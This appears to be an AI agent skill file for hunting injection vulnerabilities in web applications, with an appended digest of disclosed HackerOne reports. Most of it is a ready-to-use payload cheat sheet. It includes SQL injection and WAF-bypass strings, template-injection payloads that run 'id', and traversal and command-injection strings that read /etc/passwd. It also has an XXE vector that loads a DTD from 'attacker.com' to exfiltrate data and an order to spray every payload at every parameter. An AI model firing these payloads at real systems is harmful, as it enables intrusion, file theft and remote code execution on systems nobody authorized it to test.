---
name: hunt-web-injection
description: Hunt server-side injection vulnerabilities — SQL injection, SSTI (Jinja2/Twig/Freemarker/ERB), XXE, LFI/RFI path traversal, command injection, prototype pollution, and deserialization. Use when testing parameters accepting user input that reaches databases, templates, filesystems, XML parsers, or system shells. Trigger keywords: SQLi, SQL injection, SSTI, template injection, XXE, LFI, RFI, path traversal, command injection, RCE, deserialization, prototype pollution, OGNL.
---

# Web Injection Hunting

Priority: **RCE → SQLi → SSTI → XXE → LFI → Command Injection → Deserialization → Prototype Pollution**

## Parameter → Target Map (from XSS-Rat 2026)

| Pattern | Likely target |
|---|---|
| `q=`, `search=`, `name=`, `title=`, `comment=`, `sort=`, `order=` | SQLi / SSTI |
| `file=`, `page=`, `template=`, `path=`, `include=`, `dir=` | LFI/RFI |
| `cmd=`, `exec=`, `shell=`, `ping=`, `host=`, `domain=` | Command injection |
| `url=`, `src=`, `dest=`, `feed=`, `webhook=` | SSRF (see hunt-ssrf-oauth) |
| Any XML body / XML-accepting upload (DOCX/XLSX/SVG) | XXE |
| `redirect=`, `next=`, `returnTo=`, `goto=` | Open redirect |

## SQL Injection

### Detection
```sql
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL--
'; SELECT 1/0--    -- divide-by-zero error reveals SQLi
```

### WAF Bypass
```
/*!50000 SELECT*/ * FROM users
SE/**/LECT * FROM users
SeLeCt * FrOm uSeRs
%27 OR %271%27=%271
' OR '1'='1
```

### Where to test (non-obvious)
- JSON body values, not just query params
- Sorting/ordering params (`?sort=name`, `?order=asc`) — often concatenated into ORDER BY
- GraphQL arguments, especially numeric fields
- Header values that hit DB (X-Forwarded-For in login logs, User-Agent in analytics)
- WebSocket message payloads

## SSTI — Server-Side Template Injection

### Detection payloads
```
{{7*7}}          -> 49 = Jinja2 / Twig / generic
${7*7}           -> 49 = Freemarker / Pebble / Velocity
<%= 7*7 %>       -> 49 = ERB (Ruby)
#{7*7}           -> 49 = Mako / some Ruby
*{7*7}           -> 49 = Spring (Thymeleaf)
{{7*'7'}}        -> 7777777 = Jinja2 (Twig gives 49)
```

### Where to test
- Name/bio/description fields on profile pages
- Email templates (invoice name, username in confirmation email)
- Custom error messages, PDF generators (invoice/report export)
- URL path parameters, search queries reflected in results
- **Always test `{{7*7}}` in every user-controlled field** — cheap and high-value

### RCE payloads by engine
```python
# Jinja2 (Python/Flask)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig (PHP/Symfony)
{{["id"]|filter("system")}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# ERB (Ruby on Rails)
<%= `id` %>
```

## XXE — XML External Entity

### Test vectors
```xml
<!-- Classic file read -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>

<!-- OOB exfil -->
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe; ]>

<!-- SSRF via XXE -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

### Where to test
- Any endpoint accepting XML (`Content-Type: application/xml`, `text/xml`)
- File uploads parsed as XML: DOCX, XLSX, SVG, PDF (embedded XML), DTD
- SOAP APIs
- SVG upload with `<svg xmlns=...><image href="..."/></svg>` or `<foreignObject>`

## LFI / Path Traversal

### Test vectors
```
../../../etc/passwd
..%2f..%2f..%2fetc/passwd
....//....//....//etc/passwd
%252e%252e%252f (double-encoded)
/etc/passwd%00 (null byte, legacy)
/file?path=php://filter/convert.base64-encode/resource=config.php
```

### Escalation
- Read source code → find secrets, debug creds, other vulns
- `/proc/self/environ`, `/proc/self/cmdline` for env vars
- Log poisoning → LFI to RCE (inject PHP into access log via User-Agent, then include it)
- `php://filter` to read configs without triggering parse errors

## Command Injection

### Test vectors
```
;id
| id
`id`
$(id)
%0aid   (newline)
;cat /etc/passwd
```

### Where to test
- Ping/host/domain fields, file conversion (ImageMagick), zip/unzip endpoints
- Headers passed to shell (User-Agent, X-Forwarded-For in logging/blocking systems)
- Email "to/from" fields reaching sendmail

## Prototype Pollution (Node.js)

### Detection
```js
// Add to query params or JSON body:
{"__proto__":{"polluted":"1"}}
?__proto__[polluted]=1
constructor[prototype][polluted]=1
// Then check response for "polluted"
```
- Chain to RCE via gadgets in express, mongoose, ejs, handlebars
- Look for `Object.assign`, `_.merge`, `_.defaultsDeep`, `JSON.parse` of user input, spread operators on user objects

## Deserialization

- **Java**: `java.io.ObjectInputStream` — ysoserial gadgets
- **PHP**: `unserialize()` — POP chains (PHPGGC), phar:// deserialization
- **Python**: `pickle.loads()` — craft `__reduce__` to RCE
- **Ruby**: `Marshal.load`, `YAML.load` (not safe_load) — `system` gadget
- **.NET**: `ObjectStateFormatter`, `LosFormatter`, `ViewState`

## Language-Specific Grep (source audit)

```bash
# Python
grep -rn "pickle\.loads\|yaml\.load\|eval(\|exec(\|os\.system\|subprocess" --include="*.py"
# PHP
grep -rn "unserialize\|eval(\|preg_replace.*e" --include="*.php"
# JS/TS
grep -rn "eval(\|child_process\|execSync\|spawn(" --include="*.js" --include="*.ts"
# Go
grep -rn "template\.HTML\|template\.JS\|template\.URL" --include="*.go"
# Ruby
grep -rn "YAML\.load[^_]\|Marshal\.load\|eval(" --include="*.rb"
# Rust (decode paths only — encoding-path panics not attacker-triggerable)
grep -rn "\.unwrap()\|\.expect(" --include="*.rs" | grep -v "test\|encode\|to_bytes\|serialize"
```

## Semgrep Quick Audit

```bash
semgrep --config=p/security-audit ./
semgrep --config=p/sql-injection ./
semgrep --config=p/owasp-top-ten ./
```

## PARAMETER COVERAGE — EVERY PARAMETER, EVERY INJECTION CLASS (MANDATORY)
The #1 bug-loss failure mode is testing only the "obvious" params
(q/search/sort/file/url/name) and skipping the rest. **Every parameter on
every endpoint gets the full injection ladder** — numeric IDs, booleans,
counts, page/limit, timestamps, nested JSON keys, headers, cookies, path
segments, GraphQL args, WS fields. A skipped parameter is a skipped bug.

1. **Enumerate** the complete input set (query keys incl. non-obvious
   `format`/`_`/`callback`, all path segments, recursive JSON/form keys,
   headers, cookies, GraphQL args) and record it in the journal.
2. **Per class, sweep every parameter one at a time** (others at baseline):
   - SQLi/BSQLi: quote → boolean → time → UNION → error-based (see hunt-sqli)
   - NoSQLi: `$gt`/`$ne`/`$regex`/`$where` on every JSON value
   - SSTI: `{{7*7}}` `${{7*7}}` `#{7*7}` `<%=7*7%>` `*{7*7}` on EVERY param
     (IDs and slug params included — cheap, high value)
   - CMDi: `;id` `|id` `` `id` `` `$(id)` `%0aid` on every param and header
   - LFI: `../../etc/passwd` + wrappers on every param, not just file-named ones
   - SSRF: `127.0.0.1`/collaborator on every param (see hunt-ssrf-oauth)
   - XXE: DOCTYPE probe on every body field (XML and JSON endpoints)
   - Mass assignment: `role`/`is_admin`/`verified` on every object write
   - Wrong-type: array/object/null/negative/oversized on every param
3. **Track coverage** in the journal matrix; diff captured traffic vs tested
   params; a param blocked by WAF gets the bypass ladder, never abandonment.
4. **Observe all dimensions** per test: status, body, body SIZE, headers,
   timing, state change. Blind bugs surface in one dimension only.
5. **Re-sweep per auth context and content-type** — a param is only clean in
   ONE context.

## FIELD DATA — mined from HackerOne disclosed reports (10k-report corpus)

### Class: ssrf — 206 disclosed H1 reports (76 High/Critical)

**Parameters seen in real findings** (recurring; test each on every endpoint):

- `url`
- `id`
- `image_host`
- `AAAAAAVVAacibcMeQaa-JKcUyH-R0itjt2o5kIUgVaclQb7SjFgL4eFSChKpRUFWw5I6mpFBaG331jUn5d3UQLI_WQvnxl7pF0SjzIKjWb9DdUnLhg`
- `alt`
- `name`
- `type`
- `sentry_key`
- `sessionid`
- `sessionId`

**Representative finding shapes** (real report titles, genericized — use as test-case ideas, not templates):

- **[critical] SSRF to AWS file read** (Server-Side Request Forgery (SSRF))
  - Signal: ## Summary: after seeing the disclosure it looks like the bug was not fixed properly ## Steps To Reproduce: copy and paste the request below and paste it into Burpsuite repeater `G
- **[critical] Full Read SSRF on Gitlab's Internal Grafana** (Server-Side Request Forgery (SSRF))
  - Signal: Apparently, Grafana is bundled with Gitlab by default. So the grafana instance that is accessible via `/-/grafana/`is vulnerable to the SSRF outlined below. ## Summary By chaining 
- **[critical] SSRF in Functional Administrative Support Tool pdf generator (████) [HtUS]** (Server-Side Request Forgery (SSRF))
  - Signal: ## Summary: I found that it is possible to inject a javascript payload during the PDF form creation process, which is then executed by the checklist application server. ## Vulnerab
- **[critical] [Uppy] Internal Server side request forgery (bypass of #786956)** (Server-Side Request Forgery (SSRF))
  - Signal: I would like to report `Internal Server-side request forgery` in Uppy It allows the attacker to easily extract information from internal servers # Module **module name:** Uppy **ve

### Class: sqli — 176 disclosed H1 reports (116 High/Critical)

**Parameters seen in real findings** (recurring; test each on every endpoint):

- `alert`
- `_pageLabel`
- `pwd`
- `Submit`
- `scn`
- `check20`
- `content`
- `rcnum`
- `acctid`
- `_nfpb`

**Representative finding shapes** (real report titles, genericized — use as test-case ideas, not templates):

- **[critical] SQL Injection or Denial of Service due to a Prototype Pollution** (SQL Injection)
  - Signal: I would like to report a prototype pollution vulnerability in the `typeorm` package. It allows an attacker that is able to save a specially crafted object to pollute the `Object` p
- **[critical] Pre-Auth Blind NoSQL Injection leading to Remote Code Execution** (None)
  - Signal: **Summary:** The `getPasswordPolicy` method is vulnerable to NoSQL injection attacks and does not require authentication/authorization. It can be used to take over accounts by leak
- **[critical] [query-mysql] SQL Injection due to lack of user input sanitization allows to run arbitrary SQL queries when fetching data from database** (SQL Injection)
  - Signal: Hi Guys, There is SQL Injection in query-mysql module. Due to lack of sanitization of user input, an attacker is able to craft SQL query and get any data from the database. ## Modu
- **[critical] SQL injection in MilestoneFinder order method** (SQL Injection)
  - Signal: The `MilestoneFinder` is a class used to find milestones based on group or project identifiers. The class is used in multiple controllers. It allows to filter based on state and ca

### Class: ssti — 21 disclosed H1 reports (12 High/Critical)

**Parameters seen in real findings** (recurring; test each on every endpoint):

- `error`
- `deviceUdid`
- `dag_id`
- `userid`
- `pw`
- `name`
- `Search`
- `url`
- `client_id`
- `scope`

**Representative finding shapes** (real report titles, genericized — use as test-case ideas, not templates):

- **[critical] Handling of `tracking` command allows making arbitrary blind requests with user's cookies from Grammarly Extension's origin** (None)
  - Signal: ## **Summary:** Attacker could trigger Grammarly extension's `gnar._fetch` command using a crafted page to perform XHR with cookies and any configurational params to any cross-orig
- **[critical] ██████████ vulnerable to CVE-2022-22954** (Code Injection)
  - Signal: I found that one of the targets belongs to **DOD** vulnerable to **CVE-2022-22954** where an attacker may be able to execute any malicious code like escalating Remote code executio
- **[critical] ███ vulnerable to CVE-2022-22954** (Code Injection)
  - Signal: I found that one of the targets belongs to DOD vulnerable to CVE-2022-22954 where an attacker may be able to execute any malicious code like escalating Remote code execution is als
- **[critical] HEY.com email stored XSS** (Cross-site Scripting (XSS) - Stored)
  - Signal: An attacker can bypass the HEY.com HTML sanitizer and inject arbitrary unsafe HTML in emails. To reproduce the bug you have to send raw HTML-formatted email. You can do it e.g. wit

### Class: command-injection — 177 disclosed H1 reports (115 High/Critical)

**Parameters seen in real findings** (recurring; test each on every endpoint):

- `id`
- `scope`
- `search`
- `ref`
- `directory`
- `external`
- `isJTN`
- `dag_id`
- `ibm-submit`
- `path`

**Representative finding shapes** (real report titles, genericized — use as test-case ideas, not templates):

- **[critical] Remote Command Execution via Github import** (Command Injection - Generic)
  - Signal: ### Summary This is very similar to https://about.gitlab.com/releases/2022/08/22/critical-security-release-gitlab-15-3-1-released/#Remote%20Command%20Execution%20via%20Github%20imp
- **[critical] RCE via the DecompressedArchiveSizeValidator and Project BulkImports (behind feature flag)** (Command Injection - Generic)
  - Signal: ### Summary The `DecompressedArchiveSizeValidator` is used to check the size of a archive before extracting it: https://gitlab.com/gitlab-org/gitlab/-/blob/v15.1.0-ee/lib/gitlab/im
- **[critical] RCE via github import** (OS Command Injection)
  - Signal: Hello, While continuing mining on [github import](https://hackerone.com/reports/1665658), I found a vulnerability on gitlab.com allowing to execute remotely arbitrary commands. Git
- **[critical] Command injection by overwriting authorized_keys file through GitLab import** (Command Injection - Generic)
  - Signal: The `Projects::GitlabProjectsImportService` contains a vulnerability that allows an attacker to write files to arbitrary directories on the server. This leads to an arbitrary comma

### Class: lfi-path-traversal — 207 disclosed H1 reports (134 High/Critical)

**Parameters seen in real findings** (recurring; test each on every endpoint):

- `type`
- `textdomain`
- `lang`
- `app`
- `platform`
- `resource-type`
- `name`
- `path`
- `version`
- `vector`

**Representative finding shapes** (real report titles, genericized — use as test-case ideas, not templates):

- **[critical] Arbitrary file read via the bulk imports UploadsPipeline** (Path Traversal)
  - Signal: ### Summary The bulk imports api does not remove symlinks when untaring the uploads.tar.gz file, allowing arbitrary files to be read and uploaded when importing a group. When a gro
- **[critical] path traversal vulnerability in Grafana 8.x allows " local file read "** (None)
  - Signal: Hi team, I've found a path traversal issue in the Grafana instances hosted on the MTN platforms. With the path traversal it's possible for an unauthenticated user to read arbitrary
- **[critical] GitLab CI runner can read and poison cache of all other projects** (Path Traversal)
  - Signal: The GitLab CI runner allows users to cache files and directories in between runs. These files are stored in a ZIP file and uploaded to a shared cache instance. In my testing, the f
- **[critical] RCE as Admin defeats WordPress hardening and file permissions** (Path Traversal)
  - Signal: This vulnerability was found when I found myself in the following scenario: My collegue set up WordPress on his local machine and challenged me to hack it. Before he gave me admin 

